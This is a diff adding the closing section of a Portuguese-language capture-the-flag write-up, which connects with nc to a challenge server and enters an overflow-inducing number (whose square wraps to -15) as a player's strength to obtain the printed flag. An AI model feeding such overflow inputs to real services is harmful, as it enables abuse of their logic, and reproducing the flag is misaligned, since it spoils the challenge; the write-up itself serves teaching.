@@ -84,3 +84,26 @@ Ao rodar esse script, obtemos o seguinte output.
 Número encontrado 34716455
 34716455 ao quadrado = -15
 ```
+
+Agora, basta apenas conectar ao servidor e usar esse número como "força" de qualquer jogador
+
+```shell
+root@DESKTOP-4IEKTFM:/mnt/c/Users/Caio/Desktop# nc 52.59.124.14 5016
+Welcome to our playground for powerful people where you can pump yourself up and get awesome prizes!
+
+How many players participate?
+1
+Player 0, how strong are you right now?
+34716455
+What do you want to do?
+1) pump up
+2) cash in
+1
+What do you want to do?
+1) pump up
+2) cash in
+2
+You got an inspiration: ENO{d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve}
+```
+
+### Flag: `ENO{d0_n0t_be_s0_neg4t1ve_wh3n_y0u_sh0uld_be_pos1t1ve}`
